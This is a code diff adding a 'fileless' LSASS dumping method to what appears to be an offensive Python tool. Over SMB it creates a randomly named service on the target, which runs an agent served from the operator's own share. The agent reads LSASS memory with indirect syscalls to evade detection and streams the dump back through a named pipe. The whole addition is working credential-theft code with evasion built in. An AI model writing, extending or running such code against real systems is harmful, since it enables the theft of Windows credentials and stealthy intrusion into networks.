@@ -216,3 +216,64 @@ $s.Close()
 $c.Close()
 Remove-Item $tmp -Force
 """
+
+
+class PipeDump(DumpMethod):
+    """Fileless method: native agent loaded via UNC, dump streamed via named pipe.
+
+    The agent binary is served from a local SMB share and executed as a service.
+    It reads LSASS memory using indirect syscalls and streams the MiniDump
+    directly through a named pipe — nothing is written to the target's disk.
+    """
+
+    name = "pipe"
+
+    def __init__(self, session: SmbSession, lhost: str, agent_path: str):
+        super().__init__(session)
+        self.lhost = lhost
+        self.agent_path = agent_path
+
+    def execute(self, lsass_pid: int | None = None) -> bytes:
+        if lsass_pid is None:
+            lsass_pid = self._find_lsass_pid("")
+
+        pipe_name = random_name(12)
+        svc_name = random_name(10)
+        share_name = random_name(6)
+
+        # Service binary path points to the agent on our SMB share
+        # The agent takes: <PID> <PIPE_NAME>
+        binary_path = f"\\\\{self.lhost}\\{share_name}\\agent.exe {lsass_pid} {pipe_name}"
+
+        # Start SMB server to serve the agent
+        from .smbserver import serve_agent
+        server = serve_agent(self.agent_path, share_name)
+
+        try:
+            # Create and start the service
+            self._exec_via_service(svc_name, binary_path)
+
+            # Connect to the named pipe on the target and read the dump
+            time.sleep(2)
+            dump_data = self._read_pipe(pipe_name)
+        finally:
+            server.stop()
+
+        if not dump_data or dump_data[:4] != b"MDMP":
+            raise RuntimeError("Received data is not a valid minidump")
+
+        return dump_data
+
+    def _read_pipe(self, pipe_name: str) -> bytes:
+        """Read dump data from the agent's named pipe via IPC$."""
+        chunks = []
+        with self.session.open_pipe(pipe_name) as pipe:
+            while True:
+                try:
+                    chunk = pipe.read(65536)
+                    if not chunk:
+                        break
+                    chunks.append(chunk)
+                except Exception:
+                    break
+        return b"".join(chunks)
